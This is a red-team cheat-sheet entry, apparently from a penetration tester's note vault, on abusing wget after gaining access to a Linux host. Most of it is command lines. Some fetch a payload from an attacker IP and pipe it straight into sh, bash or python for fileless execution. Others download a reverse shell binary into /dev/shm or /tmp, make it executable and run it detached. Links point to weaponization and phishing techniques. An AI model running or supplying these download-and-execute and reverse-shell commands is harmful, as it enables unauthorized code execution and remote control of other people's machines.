# Wget

## 01 - Common Files

```
/usr/bin/wget
```

## 02 - Fileless Code Execution

This is useful if the machine doesn't have `curl` pre-installed so you can use `wget` to execute it in memory.

```
$ wget --no-hsts -qO- http[s]://<IP>/payload.sh | sh

$ wget --no-hsts -qO- http[s]://<IP>/payload.sh | bash

$ wget --no-hsts -qO- http[s]://<IP>/payload.py | python
```

## 03 - Dropping On Memory

> [!INFO] Got Permission Denied!
> If you get a `Permission denied` error while executing it in `/dev/shm/`. Check the [[07 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xL - Operating System/Manual/Living off the Land#^017cc1|mounted drives]] if `noexec` is configured. Otherwise execute it with a [[#01 - Fileless Code Execution|fileless]] method.
> > [!TIP] Compile After Delivery
> > You can automate it with a script to stage the payload execution (refer to the backlinks below).

Download reverse shell binary and execute it.

```
$ wget --no-hsts -P /dev/shm http[s]://<IP>/payload; chmod +x /dev/shm/payload; /dev/shm/payload & disown

$ wget --no-hsts -O /dev/shm/payload http[s]://<IP>/payload; chmod +x /dev/shm/payload; /dev/shm/payload & disown
```

## 04 - Dropping On Disk

Download reverse shell binary and execute it.

```
$ wget --no-hsts -O /tmp/payload http[s]://<IP>/payload; chmod +x /tmp/payload; /tmp/payload & disown
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Code Execution/C/Manual#^e621f6|Compile After Delivery: C Compiler]]

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Code Execution/CPP/Manual#^e01813|Compile After Delivery: C++ Compiler]]

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Code Execution/Java/Manual#^ae2cdb|Compile After Delivery: Java Compiler]]

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Cross Platform/Code Execution/Lua/Manual#^e48401|Compile After Delivery: Lua Compiler]]

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

### GTFOBins

- [GTFOBins: wget](https://gtfobins.github.io/gtfobins/wget/)

### GTFOArgs

- [GTFOArgs: wget](https://gtfoargs.github.io/gtfoargs/wget/)

### DMCXBlue

- [DMCXBlue: Attachments - Scripting Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-attachment/attachments-scripting-files)